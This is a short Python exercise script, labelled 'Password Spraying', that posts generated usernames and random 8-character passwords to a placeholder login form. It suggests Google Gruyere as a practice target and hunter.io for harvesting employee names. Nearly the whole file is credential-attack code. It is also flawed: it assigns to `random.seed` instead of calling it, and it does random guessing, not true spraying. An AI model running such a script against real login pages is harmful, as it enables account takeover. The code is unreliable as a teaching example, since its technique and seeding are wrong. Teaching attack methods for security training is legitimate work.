#-*-coding:UTF-8 -*
#!/usr/bin/env python

""" Exercise: Password Spraying

Very simple example of a password spraying attack.
Once the website with a form, and the login/password variable are identified, we just send a bunch of credentials to it
until we receive a positive response.

For sending data to the form, we'll use the requests libs:
https://requests.readthedocs.io/en/master/

Note that we could also have used the mechanize library (pip install python-mechanize)
If you do not want to install third party libraries, you can stick with the standard urllib/urllib2.

To test this script, you can install your own instance of google-gruyere
https://google-gruyere.appspot.com/


This is currently just sending credential, to make it fully functional, you've got to check what's the response for each credential tested.
HTTP code status is not sufficient here.
"""

import os
import random
import string
import json
import requests

# global vars
CHARS = string.ascii_letters + string.digits + "!@#$%^&*()"
random.seed = (os.urandom(1024))

USERFILE = './res/namelist.json'

# Placeholder for the request URL
URL = 'http://www.website.com/login?php=form_to_crack'


def password_generator():
	return ''.join([random.choice(CHARS) for i in range(8)])


def main():

	# Opening and parsing the names,
	# you could get a more advance namelist.json using https://hunter.io/ for instance
	employees = json.loads(open(USERFILE).read())

	for name in employees:
		name_extra = ''.join(random.choice(string.digits))

		username = name.lower() + name_extra + "@website.com"
		password = password_generator()

		requests.post(URL, allow_redirects=False, data={
			# form data
			'auid2yjauysd2uasdasdasd': username,
			'kjauysd6sAJSDhyui2yasd': password
		})

		print("Sending {} with password {}".format(username, password))
	pass


if __name__ == "__main__":
	main()
